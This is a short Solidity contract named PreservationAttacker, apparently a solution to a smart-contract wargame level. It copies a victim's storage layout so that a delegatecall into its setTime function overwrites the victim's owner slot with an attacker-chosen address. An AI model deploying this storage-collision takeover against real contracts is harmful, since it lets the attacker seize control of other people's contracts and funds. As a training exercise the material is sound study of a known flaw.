// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract PreservationAttacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function convertToUint(address _address) external pure returns (uint256) {
        uint256 num = uint256(uint160(_address));
        
        return num;
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}